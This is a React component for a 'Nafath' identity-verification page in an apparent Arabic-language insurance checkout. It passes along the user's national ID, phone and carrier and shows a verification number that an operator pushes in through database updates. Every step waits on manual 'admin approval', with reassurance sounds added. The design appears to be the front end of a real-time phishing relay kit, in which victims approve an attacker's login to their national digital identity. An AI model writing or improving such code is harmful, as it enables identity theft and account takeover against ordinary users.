import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { RefreshCw, Loader2, CheckCircle2, Smartphone, ShieldCheck } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { supabase } from "@/integrations/supabase/client";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
import { sounds } from "@/lib/sounds";

const NafathVerify = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const nv = t.nafathVerify;
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const nationalId = location.state?.nationalId;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const [verifyNumber, setVerifyNumber] = useState<string | null>(null);
  const [numberJustUpdated, setNumberJustUpdated] = useState(false);
  const prevNumberRef = useRef<string | null>(null);

  const approvalStatus = useAdminApproval(orderId, "nafath_verify");

  // Fetch & subscribe to nafath_number
  useEffect(() => {
    if (!orderId) return;
    const visitorSid = sessionStorage.getItem("visitor_sid");

    const fetchNumber = async () => {
      if (visitorSid) {
        const { data } = await supabase.rpc("get_own_order", {
          p_visitor_session_id: visitorSid,
          p_order_id: orderId,
        });
        const order = data as any;
        if (order?.nafath_number) setVerifyNumber(order.nafath_number);
      }
    };
    fetchNumber();

    const channel = supabase
      .channel(`nafath-number-${orderId}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "insurance_orders", filter: `id=eq.${orderId}` }, (payload: any) => {
        if (payload.new.nafath_number && payload.new.nafath_number !== prevNumberRef.current) {
          setVerifyNumber(payload.new.nafath_number);
        }
      })
      .subscribe();

    const interval = setInterval(fetchNumber, 3000);
    return () => { supabase.removeChannel(channel); clearInterval(interval); };
  }, [orderId]);

  // Visual + audio on number update
  useEffect(() => {
    if (verifyNumber && prevNumberRef.current !== null && prevNumberRef.current !== verifyNumber) {
      setNumberJustUpdated(true);
      sounds.reassurance();
      toast.success("تم تحديث رمز التحقق", { description: `الرمز الجديد: ${verifyNumber}` });
      if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
      setTimeout(() => setNumberJustUpdated(false), 2000);
    }
    prevNumberRef.current = verifyNumber;
  }, [verifyNumber]);

  // Handle approval
  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success(nv.verified);
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/confirmation", { state: { offer, phone, carrier, nationalId, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error(nv.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier, nationalId]);

  // Timer
  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer(t => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  const handleConfirm = async () => {
    setLoading(true);
    if (nationalId) linkVisitorToSession({ national_id: nationalId });
    const id = await createOrUpdateStage(orderId, "nafath_verify");
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = () => { setTimer(120); setCanResend(false); };
  const fmt = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  const progress = ((120 - timer) / 120) * 100;

  return (
    <VerificationLayout title={nv.title} subtitle={nv.subtitle}>
      <div className="text-center pt-6 pb-1 px-4">
        <h2 className="text-lg font-bold text-foreground">{nv.title}</h2>
        <p className="text-[11px] text-muted-foreground mt-1.5 leading-relaxed">{nv.subtitle}</p>
      </div>

      {/* Number Display */}
      <div className="flex flex-col items-center py-6 gap-3">
        <div className="relative">
          {/* Outer ring progress */}
          <svg className="w-28 h-28 -rotate-90" viewBox="0 0 100 100">
            <circle cx="50" cy="50" r="44" fill="none" stroke="hsl(var(--border))" strokeWidth="3" />
            <motion.circle
              cx="50" cy="50" r="44" fill="none"
              stroke="hsl(var(--primary))"
              strokeWidth="3"
              strokeLinecap="round"
              strokeDasharray={276.46}
              initial={{ strokeDashoffset: 276.46 }}
              animate={{ strokeDashoffset: 276.46 - (276.46 * progress / 100) }}
              transition={{ duration: 0.5 }}
              className="drop-shadow-sm"
            />
          </svg>

          {/* Inner number container */}
          <motion.div
            className={`absolute inset-0 flex items-center justify-center`}
            animate={{
              scale: numberJustUpdated ? [1, 1.05, 1] : 1,
            }}
            transition={{ duration: 0.4 }}
          >
            <div className={`w-20 h-20 rounded-2xl bg-gradient-to-br from-primary/10 to-primary/5 border-2 flex items-center justify-center transition-all duration-500 ${numberJustUpdated ? "border-primary shadow-lg shadow-primary/20" : "border-primary/30"}`}>
              <AnimatePresence mode="wait">
                {verifyNumber ? (
                  <motion.span
                    key={verifyNumber}
                    initial={{ scale: 0.3, opacity: 0, rotateY: 90 }}
                    animate={{ scale: 1, opacity: 1, rotateY: 0 }}
                    exit={{ scale: 1.5, opacity: 0 }}
                    transition={{ type: "spring", stiffness: 300 }}
                    className="text-3xl font-black text-primary tabular-nums"
                  >
                    {verifyNumber}
                  </motion.span>
                ) : (
                  <motion.div
                    key="loader"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="flex flex-col items-center gap-1"
                  >
                    <Loader2 className="w-6 h-6 text-primary animate-spin" />
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </motion.div>
        </div>

        {numberJustUpdated && (
          <motion.div
            initial={{ opacity: 0, y: -8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0 }}
            className="flex items-center gap-1.5 text-xs text-primary font-bold bg-primary/10 px-3 py-1 rounded-full"
          >
            <CheckCircle2 className="w-3.5 h-3.5" />
            تم تحديث الرمز
          </motion.div>
        )}

        {!verifyNumber && (
          <p className="text-[11px] text-muted-foreground animate-pulse">{nv.waitingNumber}</p>
        )}
      </div>

      <div className="px-5 pb-5 space-y-4">
        {waitingApproval ? (
          <WaitingApprovalOverlay
            title={nv.waitingApproval}
            subtitle={nv.waitingReview}
            icon="shield"
          />
        ) : (
          <>
            {/* Instructions Card */}
            <div className="bg-gradient-to-br from-secondary/80 to-secondary/40 rounded-xl p-4 space-y-3 text-right border border-border/50">
              <div className="flex items-start gap-3">
                <div className="w-9 h-9 rounded-xl bg-primary/10 flex items-center justify-center shrink-0 mt-0.5">
                  <Smartphone className="w-4.5 h-4.5 text-primary" />
                </div>
                <div className="space-y-1.5">
                  <p className="text-xs text-foreground leading-relaxed font-medium">
                    {nv.instructions} <span className="font-bold text-primary">{nv.nafathApp}</span> {nv.instructionsEnd} <span className="font-bold text-primary">{verifyNumber || "..."}</span>
                  </p>
                  <div className="flex items-center gap-1.5 text-[10px] text-muted-foreground">
                    <ShieldCheck className="w-3 h-3" />
                    <span>{nv.biometricNote}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Timer */}
            <div className="text-center">
              {canResend ? (
                <button onClick={handleResend} className="flex items-center gap-2 text-xs text-primary hover:text-primary/80 mx-auto font-semibold transition-colors bg-primary/5 hover:bg-primary/10 px-4 py-2 rounded-full">
                  <RefreshCw className="w-3.5 h-3.5" />{nv.sendNewCode}
                </button>
              ) : (
                <div className="inline-flex items-center gap-3 bg-secondary/70 rounded-full px-5 py-2 border border-border/50">
                  <span className="text-[10px] text-muted-foreground">{nv.codeValidity}</span>
                  <span className="text-sm text-primary font-bold font-mono tabular-nums tracking-wider">{fmt(timer)}</span>
                </div>
              )}
            </div>

            {/* Confirm Button */}
            <motion.button
              onClick={handleConfirm}
              disabled={loading}
              className="w-full text-white rounded-xl py-3.5 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg shadow-[#11998e]/25 hover:shadow-xl hover:shadow-[#11998e]/30 active:scale-[0.98]"
              style={{ background: "linear-gradient(135deg, #11998e 0%, #0e8c7f 100%)" }}
              whileTap={{ scale: 0.97 }}
            >
              {loading ? (
                <><Loader2 className="w-4 h-4 animate-spin" />{nv.verifying}</>
              ) : (
                <>
                  <CheckCircle2 className="w-4 h-4" />
                  {nv.confirmedFromApp}
                </>
              )}
            </motion.button>
          </>
        )}
      </div>
    </VerificationLayout>
  );
};

export default NafathVerify;
